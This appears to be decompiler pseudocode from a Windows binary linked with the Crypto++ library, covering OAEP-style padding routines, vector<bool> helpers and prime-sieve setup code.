  (*(void (__thiscall **)(int *, const char *, void *, char *))(v12 + 4))(
    a7,
    "EncodingParameters",
    &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
    v22);
  if ( v22[0] )
  {
    v13 = v26;
    v14 = Block;
  }
  else
  {
    v13 = v24;
    v14 = v23;
  }
  (*(void (__thiscall **)(int, _BYTE *, void *, unsigned int))(*(_DWORD *)v8 + 48))(v8, v31, v14, v13);
  memset(&v7[v30 + v30], 0, v11 - Size - v30 - 1);
  v20 = Size;
  v19 = &v31[v11 - Size];
  *(v19 - 1) = 1;
  memmove(v19, a3, v20);
  (*(void (__thiscall **)(int, _BYTE *, int))(*(_DWORD *)a2 + 36))(a2, v7, v30);
  v15 = (*(int (__thiscall **)(void *))(*(_DWORD *)v28 + 28))(v28);
  v28 = (void *)v15;
  v16 = *(_DWORD *)v15;
  LOBYTE(v32) = 6;
  (*(void (__thiscall **)(int, int, _BYTE *, int, _BYTE *, int, int))(v16 + 4))(v15, v8, v31, v33, v7, v30, 1);
  (*(void (__thiscall **)(int, int, _BYTE *, int, _BYTE *, int, int))(*(_DWORD *)v15 + 4))(
    v15,
    v8,
    v7,
    v30,
    v31,
    v33,
    1);
  (**(void (__thiscall ***)(int, int))v15)(v15, 1);
  v17 = &v25;
  if ( v25 >= v26 )
    v17 = &v26;
  LOBYTE(v32) = 7;
  v21 = Block;
  memset(Block, 0, *v17);
  j_j___free_base(v21);
  return (**(int (__thiscall ***)(int, int))v8)(v8, 1);
}
// 4624C0: using guessed type char var_38[4];

//----- (00462670) --------------------------------------------------------
_BYTE *__thiscall sub_462670(_DWORD *this, _BYTE *a2, char *a3, unsigned int a4, void *a5, int *a6)
{
  char v6; // al
  int v7; // eax
  size_t v8; // ebx
  int v9; // esi
  void (__thiscall **v10)(_DWORD, _DWORD); // eax
  bool v11; // zf
  char *v12; // edi
  int v13; // eax
  char *v14; // ebx
  int v15; // eax
  char *v16; // edi
  char *v17; // ebx
  char *v18; // eax
  char *v19; // ecx
  bool v20; // al
  char v21; // bl
  unsigned int v22; // ecx
  void *v23; // edx
  char *v24; // edi
  size_t v25; // edi
  _BYTE *v26; // ebx
  unsigned int v27; // ecx
  void *v28; // edx
  void *v29; // edx
  unsigned int v30; // ecx
  void *v31; // edx
  void *v32; // edx
  char v34[4]; // [esp+28h] [ebp-4Ch] BYREF
  void *v35; // [esp+2Ch] [ebp-48h]
  unsigned int v36; // [esp+30h] [ebp-44h]
  unsigned int v37; // [esp+38h] [ebp-3Ch]
  unsigned int v38; // [esp+3Ch] [ebp-38h]
  void *Block; // [esp+40h] [ebp-34h]
  unsigned int v40; // [esp+44h] [ebp-30h]
  _BYTE *v41; // [esp+48h] [ebp-2Ch]
  int *v42; // [esp+4Ch] [ebp-28h]
  int v43; // [esp+50h] [ebp-24h]
  _DWORD *v44; // [esp+54h] [ebp-20h]
  void *v45; // [esp+58h] [ebp-1Ch]
  int v46; // [esp+5Ch] [ebp-18h]
  char *v47; // [esp+60h] [ebp-14h]
  bool v48; // [esp+67h] [ebp-Dh]
  int v49; // [esp+70h] [ebp-4h]

  v44 = this;
  v41 = a2;
  v47 = a3;
  v42 = a6;
  v48 = 0;
  if ( (a4 & 7) != 0 )
  {
    v6 = *a3;
    v47 = a3 + 1;
    v48 = v6 != 0;
  }
  v7 = *this;
  v8 = a4 >> 3;
  v40 = a4 >> 3;
  v9 = (*(int (__thiscall **)(_DWORD *))(v7 + 24))(this);
  v10 = *(void (__thiscall ***)(_DWORD, _DWORD))v9;
  v49 = 0;
  v43 = ((int (__thiscall *)(int))v10[8])(v9);
  v46 = (a4 >> 3) - v43;
  if ( a4 >> 3 < 2 * v43 + 1 || (v11 = !v48, v48 = 0, !v11) )
    v48 = 1;
  if ( v8 )
  {
    v45 = sub_45AEA0(v8);
    v12 = (char *)v45;
  }
  else
  {
    v12 = 0;
    v45 = 0;
  }
  if ( v47 && v12 )
  {
    sub_438F30(v12, v8, v47, v8);
  }
  else if ( v8 )
  {
    memset(v12, 0, v8);
  }
  LOBYTE(v49) = 2;
  v47 = &v12[v43];
  v44 = (_DWORD *)(*(int (__thiscall **)(_DWORD *))(*v44 + 28))(v44);
  v13 = *v44;
  LOBYTE(v49) = 3;
  (*(void (__thiscall **)(_DWORD *, int, void *, int, char *, int, int))(v13 + 4))(v44, v9, v45, v43, &v12[v43], v46, 1);
  v14 = &v12[v43];
  (*(void (__thiscall **)(_DWORD *, int, char *, int, void *, int, int))(*v44 + 4))(
    v44,
    v9,
    &v12[v43],
    v46,
    v45,
    v43,
    1);
  v37 = -1;
  v38 = 0;
  Block = 0;
  v35 = 0;
  v36 = 0;
  v34[0] = 0;
  v15 = *v42;
  LOBYTE(v49) = 8;
  (*(void (__thiscall **)(int *, const char *, void *, char *))(v15 + 4))(
    v42,
    "EncodingParameters",
    &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
    v34);
  v16 = &v14[v46];
  v17 = &v14[v43];
  v18 = (char *)memchr(v17, 1, v16 - v17);
  v19 = v16;
  if ( v18 )
    v19 = v18;
  v42 = (int *)v19;
  v20 = v19 == v16 || v48;
  if ( v17 == v19 )
    goto LABEL_25;
  while ( !*v17 )
  {
    if ( ++v17 == v19 )
      goto LABEL_25;
  }
  if ( v17 == v19 )
  {
LABEL_25:
    if ( !v20 )
    {
      v21 = 0;
      goto LABEL_28;
    }
  }
  v21 = 1;
LABEL_28:
  if ( v34[0] )
  {
    v22 = v38;
    v23 = Block;
  }
  else
  {
    v22 = v36;
    v23 = v35;
  }
  v24 = v47;
  if ( !(*(unsigned __int8 (__thiscall **)(int, char *, void *, unsigned int))(*(_DWORD *)v9 + 56))(v9, v47, v23, v22)
    || v21 )
  {
    v26 = v41;
    *v41 = 0;
    *((_DWORD *)v26 + 1) = 0;
    v30 = v38;
    v31 = Block;
    if ( v37 < v38 )
      v30 = v37;
    LOBYTE(v49) = 9;
    memset(Block, 0, v30);
    j_j___free_base(v31);
    (*(void (__thiscall **)(_DWORD *, int))*v44)(v44, 1);
    v32 = v45;
    memset(v45, 0, v40);
    LOBYTE(v49) = 10;
    j_j___free_base(v32);
    (**(void (__thiscall ***)(int, int))v9)(v9, 1);
  }
  else
  {
    v25 = v46 + v24 - ((char *)v42 + 1);
    memmove(a5, (char *)v42 + 1, v25);
    v26 = v41;
    *v41 = 1;
    *((_DWORD *)v26 + 1) = v25;
    v27 = v38;
    v28 = Block;
    if ( v37 < v38 )
      v27 = v37;
    LOBYTE(v49) = 11;
    memset(Block, 0, v27);
    j_j___free_base(v28);
    (*(void (__thiscall **)(_DWORD *, int))*v44)(v44, 1);
    v29 = v45;
    memset(v45, 0, v40);
    LOBYTE(v49) = 12;
    j_j___free_base(v29);
    (**(void (__thiscall ***)(int, int))v9)(v9, 1);
  }
  return v26;
}
// 462670: using guessed type char var_4C[4];

//----- (00462940) --------------------------------------------------------
int sub_462940()
{
  return dword_4F0110;
}
// 4F0110: using guessed type int dword_4F0110;

//----- (00462950) --------------------------------------------------------
_DWORD *__thiscall sub_462950(_DWORD *this)
{
  this[1] = 0x3FFFFFFF;
  this[2] = 0;
  this[3] = sub_43CB70(0, 0);
  return this;
}

//----- (00462980) --------------------------------------------------------
int __thiscall sub_462980(int this, char *a2, _DWORD *a3)
{
  unsigned int v5; // ecx
  unsigned int v6; // edx
  int v7; // ebp
  int v8; // ebx
  _DWORD *v9; // ecx
  char *v10; // edx
  _DWORD *v12; // [esp+Ch] [ebp+4h]

  if ( (unsigned int)a2 > 0x3FFFFFFF )
    sub_420130();
  v5 = (*(_DWORD *)(this + 8) - *(_DWORD *)this) >> 2;
  v6 = v5 >> 1;
  v7 = (*(_DWORD *)(this + 4) - *(_DWORD *)this) >> 2;
  if ( v5 <= 0x3FFFFFFF - (v5 >> 1) )
  {
    v8 = v6 + v5;
    if ( v6 + v5 < (unsigned int)a2 )
      v8 = (int)a2;
  }
  else
  {
    v8 = (int)a2;
  }
  v12 = sub_4343B0(v8);
  v9 = &v12[v7];
  v10 = &a2[-v7];
  if ( a2 != (char *)v7 )
  {
    do
    {
      *v9++ = *a3;
      --v10;
    }
    while ( v10 );
  }
  memmove_0(v12, *(const void **)this, *(_DWORD *)(this + 4) - *(_DWORD *)this);
  return sub_434350((_DWORD *)this, (int)v12, (int)a2, v8);
}
// 420130: using guessed type void __noreturn sub_420130(void);

//----- (00462A20) --------------------------------------------------------
_DWORD *__thiscall sub_462A20(int *this, _DWORD *a2, int a3)
{
  int v3; // edx
  unsigned int v4; // ecx
  unsigned int v5; // ecx
  _DWORD *result; // eax
  unsigned int v7; // ecx

  v3 = *this;
  v4 = this[1];
  if ( a3 >= 0 || v4 >= -a3 )
  {
    v7 = a3 + v4;
    result = a2;
    *a2 = v3 + 4 * (v7 >> 5);
    a2[1] = v7 & 0x1F;
  }
  else
  {
    v5 = a3 + v4;
    result = a2;
    *a2 = v3 - (4 * (~v5 >> 5) + 4);
    a2[1] = v5 & 0x1F;
  }
  return result;
}

//----- (00462A90) --------------------------------------------------------
int __thiscall sub_462A90(int this, int a2, int a3, unsigned int a4)
{
  unsigned int v5; // edi
  int v6; // ebx
  int v7; // ecx
  int v8; // eax
  int v9; // ebp
  unsigned int v10; // edx
  unsigned int v11; // ecx
  unsigned int v12; // edx
  int v13; // ebp
  int **v15; // eax
  int *v16; // edi
  int v17; // esi
  _DWORD *v18; // eax
  _DWORD *v19; // edx
  int v20; // ecx
  _DWORD *v21; // ebp
  int v22; // ebx
  int v23; // eax
  int v24[2]; // [esp+Ch] [ebp-24h] BYREF
  int v25; // [esp+14h] [ebp-1Ch]
  int v26[2]; // [esp+18h] [ebp-18h] BYREF
  int v27; // [esp+20h] [ebp-10h] BYREF
  int v28; // [esp+28h] [ebp-8h] BYREF

  v5 = a4;
  v6 = a3 + 32 * ((a2 - *(_DWORD *)this) >> 2);
  v25 = v6;
  if ( a4 )
  {
    v7 = *(_DWORD *)(this + 12);
    if ( 0x7FFFFFFF - v7 < a4 )
      sub_462BF0(this);
    v8 = *(_DWORD *)this;
    v24[0] = 0;
    v9 = *(_DWORD *)(this + 4);
    v10 = (v7 + a4 + 31) >> 5;
    v11 = (v9 - v8) >> 2;
    if ( v10 >= v11 )
    {
      if ( v10 > v11 )
      {
        if ( v10 <= (*(_DWORD *)(this + 8) - *(_DWORD *)this) >> 2 )
        {
          v12 = v10 - v11;
          if ( v12 )
          {
            v9 += 4 * v12;
            memset(*(void **)(this + 4), 0, 4 * v12);
            v5 = a4;
          }
          *(_DWORD *)(this + 4) = v9;
        }
        else
        {
          sub_462980(this, (char *)v10, v24);
        }
      }
    }
    else
    {
      *(_DWORD *)(this + 4) = v8 + 4 * v10;
    }
    v13 = *(_DWORD *)(this + 12);
    if ( !v13 )
    {
      *(_DWORD *)(this + 12) = v5;
      return v6;
    }
    sub_462C00((int *)this, v26);
    v24[1] = 0;
    *(_DWORD *)(this + 12) = v5 + v13;
    v24[0] = *(_DWORD *)this;
    v15 = (int **)sub_462C00((int *)this, &v27);
    v16 = *v15;
    v17 = (int)v15[1];
    v18 = sub_462A20(v24, &v28, v6);
    v19 = (_DWORD *)v26[0];
    v20 = v26[1];
    v21 = (_DWORD *)*v18;
    v22 = v18[1];
    while ( v21 != v19 || v22 != v20 )
    {
      if ( v20 )
      {
        --v20;
      }
      else
      {
        v20 = 31;
        --v19;
      }
      if ( v17 )
      {
        --v17;
      }
      else
      {
        v17 = 31;
        --v16;
      }
      v23 = *v16;
      if ( ((1 << v20) & *v19) != 0 )
        *v16 = v23 | (1 << v17);
      else
        *v16 = v23 & ~(1 << v17);
    }
    return v25;
  }
  return v6;
}
// 462BF0: using guessed type void __thiscall __noreturn sub_462BF0(_DWORD);

//----- (00462BF0) --------------------------------------------------------
void __noreturn sub_462BF0()
{
  sub_46A183((int)"vector<bool> too long");
}
// 462BF0: using guessed type void __noreturn sub_462BF0();

//----- (00462C00) --------------------------------------------------------
_DWORD *__thiscall sub_462C00(int *this, _DWORD *a2)
{
  int v2; // edx
  int v3; // ecx
  _DWORD *result; // eax

  v2 = *this;
  v3 = this[3];
  result = a2;
  if ( v3 >= 0 )
    *a2 = v2 + 4 * ((unsigned int)v3 >> 5);
  else
    *a2 = v2 - (4 * ((unsigned int)~v3 >> 5) + 4);
  a2[1] = v3 & 0x1F;
  return result;
}
// 462C0D: conditional instruction was optimized away because ecx.4<0

//----- (00462C50) --------------------------------------------------------
int __thiscall sub_462C50(int this, int a2, _DWORD *a3)
{
  char v4; // bl
  _DWORD *v5; // eax
  _DWORD *v6; // esi
  int v7; // eax
  void (__thiscall ***v8)(_DWORD, int); // ecx
  void (__thiscall ***v9)(_DWORD, int); // ecx
  int v11; // [esp+28h] [ebp+8h]

  v4 = *(_BYTE *)(this + 8);
  v5 = operator new(0x28u);
  v6 = v5;
  if ( v5 )
  {
    v5[1] = a2;
    *((_BYTE *)v5 + 8) = v4;
    *((_BYTE *)v5 + 9) = 0;
    v5[3] = 0;
    *v5 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';
    sub_43D420(v5 + 4, a3);
  }
  else
  {
    v6 = 0;
  }
  v7 = *(_DWORD *)(this + 4);
  *(_DWORD *)(this + 4) = 0;
  v8 = (void (__thiscall ***)(_DWORD, int))v6[3];
  v11 = v7;
  if ( v8 )
  {
    (**v8)(v8, 1);
    v7 = v11;
  }
  v6[3] = v7;
  v9 = *(void (__thiscall ****)(_DWORD, int))(this + 4);
  if ( v9 )
    (**v9)(v9, 1);
  *(_DWORD *)(this + 4) = v6;
  *(_BYTE *)(this + 8) = v4;
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BACD4: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';

//----- (00462D20) --------------------------------------------------------
int __thiscall sub_462D20(const void **this, _BYTE *Src, _WORD *a3)
{
  int v4; // ebx
  int v5; // eax
  unsigned int v6; // ecx
  unsigned int v7; // ebp
  unsigned int v8; // edx
  unsigned int v9; // edi
  _DWORD *v10; // eax
  _BYTE *v11; // ecx
  const void *v12; // edx
  void *v14; // [esp+8h] [ebp-Ch]
  char *v15; // [esp+Ch] [ebp-8h]
  int v16; // [esp+10h] [ebp-4h]

  v4 = (Src - (_BYTE *)*this) >> 1;
  v5 = ((_BYTE *)this[1] - (_BYTE *)*this) >> 1;
  if ( v5 == 0x7FFFFFFF )
    sub_420130();
  v6 = ((_BYTE *)this[2] - (_BYTE *)*this) >> 1;
  v7 = v5 + 1;
  v8 = v6 >> 1;
  if ( v6 <= 0x7FFFFFFF - (v6 >> 1) )
  {
    v9 = v8 + v6;
    if ( v8 + v6 < v7 )
      v9 = v5 + 1;
  }
  else
  {
    v9 = v5 + 1;
  }
  v10 = sub_466250(v9);
  v14 = v10;
  v16 = 2 * v4;
  v15 = (char *)v10 + v16;
  *(_WORD *)((char *)v10 + v16) = *a3;
  v11 = this[1];
  v12 = *this;
  if ( Src == v11 )
  {
    memmove_0(v10, v12, v11 - (_BYTE *)v12);
  }
  else
  {
    memmove_0(v10, v12, Src - (_BYTE *)v12);
    memmove_0(v15 + 2, Src, (_BYTE *)this[1] - Src);
  }
  sub_466170(this, (int)v14, v7, v9);
  return (int)*this + v16;
}
// 420130: using guessed type void __noreturn sub_420130(void);

//----- (00462E00) --------------------------------------------------------
_DWORD *__thiscall sub_462E00(_DWORD *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, int a5)
{
  sub_43D420(this, a2);
  sub_43D420(this + 6, a3);
  sub_43D420(this + 12, a4);
  this[18] = a5;
  this[19] = 0;
  this[20] = 0;
  this[21] = 0;
  this[22] = 0;
  this[23] = 0;
  sub_463390(this);
  return this;
}

//----- (00462F60) --------------------------------------------------------
void __thiscall sub_462F60(_DWORD *this)
{
  _DWORD *v2; // ecx
  int v3; // edx
  int v4; // edx
  unsigned int v5; // edx
  void *v6; // esi
  void *v7; // [esp-4h] [ebp-20h]
  void *v8; // [esp-4h] [ebp-20h]

  v2 = (_DWORD *)this[20];
  if ( v2 )
  {
    if ( (unsigned int)(4 * ((this[22] - (int)v2) >> 2)) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_46C87D(v2);
    this[20] = 0;
    this[21] = 0;
    this[22] = 0;
  }
  v7 = (void *)this[16];
  v3 = *(_DWORD *)((char *)this + (this[14] < this[15] ? 0xFFFFFFFC : 0) + 60);
  memset(v7, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v7);
  else
    j_j___free_base(v7);
  v8 = (void *)this[10];
  v4 = *(_DWORD *)((char *)this + (this[8] < this[9] ? 0xFFFFFFFC : 0) + 36);
  memset(v8, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v8);
  else
    j_j___free_base(v8);
  v5 = this[3];
  if ( this[2] < v5 )
    v5 = this[2];
  v6 = (void *)this[4];
  memset(v6, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (00463090) --------------------------------------------------------
_DWORD *__stdcall sub_463090(_DWORD *a1, unsigned int a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  unsigned int v4; // edx
  void *v5; // ebx
  _DWORD *v7; // [esp+0h] [ebp-3Ch]
  int v8; // [esp+14h] [ebp-28h] BYREF
  unsigned int v9; // [esp+1Ch] [ebp-20h]
  unsigned int v10; // [esp+20h] [ebp-1Ch]
  void *Block; // [esp+24h] [ebp-18h]
  int v12; // [esp+2Ch] [ebp-10h]
  int v13; // [esp+38h] [ebp-4h]

  v12 = 0;
  v2 = sub_43D420(&v8, v7);
  v13 = 1;
  v3 = (_DWORD *)sub_43E590((int)v2, a2);
  sub_43D420(a1, v3);
  v12 = 1;
  v4 = v10;
  v5 = Block;
  if ( v9 < v10 )
    v4 = v9;
  v13 = 2;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return a1;
}
// 4630C3: variable 'v7' is possibly undefined
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (00463140) --------------------------------------------------------
_DWORD *__thiscall sub_463140(_DWORD *this, int a2)
{
  unsigned int v2; // esi
  unsigned int v3; // esi
  _DWORD *result; // eax
  unsigned int v5; // esi

  if ( a2 >= 0 || (v2 = this[1], v2 >= -a2) )
  {
    v5 = a2 + this[1];
    this[1] = v5;
    *this += 4 * (v5 >> 5);
    result = this;
    this[1] = v5 & 0x1F;
  }
  else
  {
    v3 = a2 + v2;
    this[1] = v3;
    *this += -4 - 4 * (~v3 >> 5);
    this[1] = v3 & 0x1F;
    return this;
  }
  return result;
}

//----- (004631A0) --------------------------------------------------------
_DWORD *__thiscall sub_4631A0(_DWORD *this, char a2)
{
  _DWORD *v3; // eax

  v3 = (_DWORD *)*this;
  if ( *this )
  {
    if ( ((this[2] - (_DWORD)v3) & 0xFFFFFFFE) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00463210) --------------------------------------------------------
_DWORD *__cdecl sub_463210(_DWORD *a1, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6)
{
  unsigned int v6; // edx
  void *v7; // esi
  unsigned int v8; // edx
  void *v9; // esi
  unsigned int v10; // edx
  void *v11; // esi
  unsigned int v12; // edx
  void *v13; // esi
  _DWORD v15[2]; // [esp+10h] [ebp-70h] BYREF
  unsigned int v16; // [esp+18h] [ebp-68h]
  unsigned int v17; // [esp+1Ch] [ebp-64h]
  void *v18; // [esp+20h] [ebp-60h]
  _DWORD v19[2]; // [esp+28h] [ebp-58h] BYREF
  unsigned int v20; // [esp+30h] [ebp-50h]
  unsigned int v21; // [esp+34h] [ebp-4Ch]
  void *v22; // [esp+38h] [ebp-48h]
  _DWORD v23[2]; // [esp+40h] [ebp-40h] BYREF
  unsigned int v24; // [esp+48h] [ebp-38h]
  unsigned int v25; // [esp+4Ch] [ebp-34h]
  void *v26; // [esp+50h] [ebp-30h]
  _DWORD v27[2]; // [esp+58h] [ebp-28h] BYREF
  unsigned int v28; // [esp+60h] [ebp-20h]
  unsigned int v29; // [esp+64h] [ebp-1Ch]
  void *Block; // [esp+68h] [ebp-18h]
  int v31; // [esp+70h] [ebp-10h]
  int v32; // [esp+7Ch] [ebp-4h]

  v31 = 0;
  sub_4431A0(a4, v15, a2);
  v31 = 2;
  v32 = 1;
  sub_44E440(a6, v19, (int)v15);
  v31 = 6;
  LOBYTE(v32) = 2;
  sub_4432F0(v19, v23, a5);
  v31 = 14;
  LOBYTE(v32) = 3;
  sub_44E440(a3, v27, (int)v23);
  v31 = 30;
  LOBYTE(v32) = 4;
  sub_443C50(v27, a1, a2);
  v31 = 63;
  v6 = v29;
  v7 = Block;
  if ( v28 < v29 )
    v6 = v28;
  LOBYTE(v32) = 5;
  memset(Block, 0, 4 * v6);
  if ( v6 )
    j_j_unknown_libname_61(v7);
  else
    j_j___free_base(v7);
  v8 = v25;
  v9 = v26;
  if ( v24 < v25 )
    v8 = v24;
  LOBYTE(v32) = 6;
  memset(v26, 0, 4 * v8);
  if ( v8 )
    j_j_unknown_libname_61(v9);
  else
    j_j___free_base(v9);
  v10 = v21;
  v11 = v22;
  if ( v20 < v21 )
    v10 = v20;
  LOBYTE(v32) = 7;
  memset(v22, 0, 4 * v10);
  if ( v10 )
    j_j_unknown_libname_61(v11);
  else
    j_j___free_base(v11);
  v12 = v17;
  v13 = v18;
  if ( v16 < v17 )
    v12 = v16;
  v32 = 8;
  memset(v18, 0, 4 * v12);
  if ( v12 )
    j_j_unknown_libname_61(v13);
  else
    j_j___free_base(v13);
  return a1;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 463210: using guessed type _DWORD var_70[2];
// 463210: using guessed type _DWORD var_58[2];
// 463210: using guessed type _DWORD var_40[2];
// 463210: using guessed type _DWORD var_28[2];

//----- (00463390) --------------------------------------------------------
void __thiscall sub_463390(_DWORD *this)
{
  int *v2; // eax
  int v3; // ecx
  int v4; // eax
  _DWORD *v5; // esi
  int v6; // eax
  _DWORD *v7; // ecx
  unsigned int v8; // edx
  void *v9; // esi
  unsigned int v10; // edx
  void *v11; // esi
  unsigned int v12; // edx
  void *v13; // esi
  unsigned int v14; // edx
  void *v15; // esi
  unsigned int v16; // edx
  void *v17; // esi
  int v18; // eax
  int *v19; // ebx
  _DWORD *v20; // esi
  unsigned int v21; // esi
  _DWORD *v22; // edi
  unsigned __int16 v23; // ax
  unsigned int v24; // edx
  void *v25; // esi
  unsigned int v26; // edx
  void *v27; // esi
  _DWORD *v28; // esi
  unsigned int v29; // eax
  unsigned __int16 v30; // bx
  unsigned __int16 v31; // ax
  int v32; // esi
  unsigned __int16 v33; // cx
  unsigned int v34; // edx
  void *v35; // esi
  unsigned int v36; // edx
  void *v37; // esi
  unsigned int v38; // [esp-8h] [ebp-9Ch]
  int v39; // [esp+10h] [ebp-84h] BYREF
  unsigned int v40; // [esp+18h] [ebp-7Ch]
  unsigned int v41; // [esp+1Ch] [ebp-78h]
  void *Block; // [esp+20h] [ebp-74h]
  _DWORD v43[2]; // [esp+28h] [ebp-6Ch] BYREF
  unsigned int v44; // [esp+30h] [ebp-64h]
  unsigned int v45; // [esp+34h] [ebp-60h]
  void *v46; // [esp+38h] [ebp-5Ch]
  _DWORD v47[2]; // [esp+40h] [ebp-54h] BYREF
  unsigned int v48; // [esp+48h] [ebp-4Ch]
  unsigned int v49; // [esp+4Ch] [ebp-48h]
  void *v50; // [esp+50h] [ebp-44h]
  _DWORD v51[2]; // [esp+58h] [ebp-3Ch] BYREF
  unsigned int v52; // [esp+60h] [ebp-34h]
  unsigned int v53; // [esp+64h] [ebp-30h]
  void *v54; // [esp+68h] [ebp-2Ch]
  int v55; // [esp+70h] [ebp-24h] BYREF
  unsigned int v56; // [esp+78h] [ebp-1Ch]
  unsigned int v57; // [esp+7Ch] [ebp-18h]
  void *v58; // [esp+80h] [ebp-14h]
  int v59; // [esp+90h] [ebp-4h]
  _DWORD v60[2]; // [esp+94h] [ebp+0h] BYREF
  unsigned int v61; // [esp+9Ch] [ebp+8h]
  unsigned int v62; // [esp+A0h] [ebp+Ch]
  void *v63; // [esp+A4h] [ebp+10h]
  _DWORD v64[2]; // [esp+ACh] [ebp+18h] BYREF
  unsigned int v65; // [esp+B4h] [ebp+20h]
  unsigned int v66; // [esp+B8h] [ebp+24h]
  void *v67; // [esp+BCh] [ebp+28h]
  _DWORD v68[2]; // [esp+C4h] [ebp+30h] BYREF
  unsigned int v69; // [esp+CCh] [ebp+38h]
  unsigned int v70; // [esp+D0h] [ebp+3Ch]
  void *v71; // [esp+D4h] [ebp+40h]
  _DWORD v72[2]; // [esp+DCh] [ebp+48h] BYREF
  unsigned int v73; // [esp+E4h] [ebp+50h]
  unsigned int v74; // [esp+E8h] [ebp+54h]
  void *v75; // [esp+ECh] [ebp+58h]
  int v76; // [esp+F4h] [ebp+60h]
  unsigned int i; // [esp+FCh] [ebp+68h]
  _DWORD *v78; // [esp+100h] [ebp+6Ch]
  unsigned int v79; // [esp+104h] [ebp+70h]
  _DWORD *v80; // [esp+108h] [ebp+74h]

  v80 = this;
  v2 = (int *)sub_465BB0();
  v3 = *v2;
  v4 = v2[1] - *v2;
  v76 = v3;
  v79 = v4 >> 1;
  sub_43D500(v60, 1u);
  v59 = 3;
  sub_4431A0(this + 6, v64, (int)this);
  v78 = this + 12;
  sub_441920(v64, v68, this + 12);
  sub_443C50(v68, v72, (int)v60);
  v5 = sub_43D500(&v39, 0x8000u);
  LOBYTE(v59) = 4;
  v6 = sub_440F30(v72, (int)v5);
  v7 = v72;
  if ( v6 >= 0 )
    v7 = v5;
  i = sub_440FF0((int)v7);
  v8 = v41;
  v9 = Block;
  if ( v40 < v41 )
    v8 = v40;
  LOBYTE(v59) = 5;
  memset(Block, 0, 4 * v8);
  if ( v8 )
    j_j_unknown_libname_61(v9);
  else
    j_j___free_base(v9);
  v10 = v74;
  v11 = v75;
  if ( v73 < v74 )
    v10 = v73;
  LOBYTE(v59) = 6;
  memset(v75, 0, 4 * v10);
  if ( v10 )
    j_j_unknown_libname_61(v11);
  else
    j_j___free_base(v11);
  v12 = v70;
  v13 = v71;
  if ( v69 < v70 )
    v12 = v69;
  LOBYTE(v59) = 7;
  memset(v71, 0, 4 * v12);
  if ( v12 )
    j_j_unknown_libname_61(v13);
  else
    j_j___free_base(v13);
  v14 = v66;
  v15 = v67;
  if ( v65 < v66 )
    v14 = v65;
  LOBYTE(v59) = 8;
  memset(v67, 0, 4 * v14);
  if ( v14 )
    j_j_unknown_libname_61(v15);
  else
    j_j___free_base(v15);
  v16 = v62;
  v17 = v63;
  if ( v61 < v62 )
    v16 = v61;
  v59 = 9;
  memset(v63, 0, 4 * v16);
  if ( v16 )
    j_j_unknown_libname_61(v17);
  else
    j_j___free_base(v17);
  v18 = this[20];
  v19 = this + 20;
  v59 = -1;
  v38 = i;
  v19[1] = v18;
  v19[3] = 0;
  sub_466460(v19, v38, 0);
  v20 = v80;
  if ( v80[18] )
  {
    sub_43D500(v51, v80[18]);
    v59 = 10;
    sub_4431A0(v20, &v55, (int)v51);
    LOBYTE(v59) = 11;
    sub_43DC30(v43, 1u);
    v24 = v57;
    v25 = v58;
    if ( v56 < v57 )
      v24 = v56;
    LOBYTE(v59) = 14;
    memset(v58, 0, 4 * v24);
    if ( v24 )
      j_j_unknown_libname_61(v25);
    else
      j_j___free_base(v25);
    v26 = v53;
    v27 = v54;
    if ( v52 < v53 )
      v26 = v52;
    LOBYTE(v59) = 16;
    memset(v54, 0, 4 * v26);
    if ( v26 )
      j_j_unknown_libname_61(v27);
    else
      j_j___free_base(v27);
    v28 = v78;
    LOBYTE(v59) = 15;
    sub_43DC30(v47, 1u);
    v29 = 0;
    LOBYTE(v59) = 17;
    for ( i = 0; v29 < v79; i = v29 )
    {
      v30 = *(_WORD *)(v76 + 2 * v29);
      v31 = sub_442B70(v28, v30);
      v32 = v31;
      sub_465F20(v80 + 20, v30, v80, v78, v31);
      v33 = 2 * v32;
      if ( 2 * v32 >= (unsigned int)v30 )
        v33 = 2 * v32 - v30;
      sub_465F20(v80 + 20, v30, v43, v47, v33);
      v28 = v78;
      v29 = i + 1;
    }
    v34 = v49;
    v35 = v50;
    if ( v48 < v49 )
      v34 = v48;
    LOBYTE(v59) = 18;
    memset(v50, 0, 4 * v34);
    if ( v34 )
      j_j_unknown_libname_61(v35);
    else
      j_j___free_base(v35);
    v36 = v45;
    v37 = v46;
    if ( v44 < v45 )
      v36 = v44;
    v59 = 19;
    memset(v46, 0, 4 * v36);
    if ( v36 )
      j_j_unknown_libname_61(v37);
    else
      j_j___free_base(v37);
  }
  else
  {
    v21 = 0;
    if ( v79 )
    {
      v22 = v78;
      do
      {
        v23 = sub_442B70(v22, *(unsigned __int16 *)(v76 + 2 * v21));
        sub_465F20(v19, *(_WORD *)(v76 + 2 * v21++), v80, v22, v23);
      }
      while ( v21 < v79 );
    }
  }
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 463390: using guessed type _DWORD var_78[2];
